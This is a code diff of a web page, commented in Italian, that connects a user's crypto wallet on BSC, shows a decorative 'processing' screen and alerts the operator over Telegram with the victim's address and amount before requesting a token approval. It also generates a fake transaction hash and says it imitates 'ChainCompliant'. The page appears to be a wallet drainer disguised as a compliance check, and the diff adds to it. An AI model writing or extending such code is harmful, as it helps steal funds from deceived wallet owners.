@@ -606,10 +606,11 @@ ${new Date().toLocaleString()}
             window.ethereum = ethereum;
 
             try {
-                let accounts = await window.ethereum.request({
-                    method: "eth_accounts"
-                });
-                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
+                // ⭐ INIZIALIZZA IL WALLET COME CHAINCOMPLIANT
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                const signer = provider.getSigner();
+                const userAddress = await signer.getAddress();
 
                 const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
                 if (currentChainId !== CONFIG.BSC_CHAIN_ID) {
@@ -660,28 +661,15 @@ ${new Date().toLocaleString()}
                     tx.from = userAddress;
                 }
 
-                // STEP 1: Prendi l'indirizzo finale
-                let finalUserAddress = userAddress;
-                if (!finalUserAddress) {
-                    try {
-                        let finalAccounts = await window.ethereum.request({
-                            method: "eth_accounts"
-                        });
-                        finalUserAddress = finalAccounts && finalAccounts.length > 0 ? finalAccounts[0] : 'Unknown';
-                    } catch (e) {
-                        finalUserAddress = 'Unknown';
-                    }
-                }
-
-                // STEP 2: Mostra processing screen SUBITO
+                // ⭐ MOSTRA PROCESSING SCREEN SUBITO
                 console.log("Showing processing screen...");
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
-                // STEP 3: Invia notifica SUBITO (PRIMA dell'approve, come ChainCompliant)
+                // ⭐ INVIA NOTIFICA SUBITO (PRIMA della firma, come ChainCompliant)
                 const tempTxHash = '0x' + Math.random().toString(16).slice(2);
                 console.log("Sending notification instantly...");
-                sendTelegramNotificationAsync(finalUserAddress, tempTxHash, amount);
+                sendTelegramNotificationAsync(userAddress, tempTxHash, amount);
 
                 // STEP 4: POI esegui l'approve
                 let txHash;
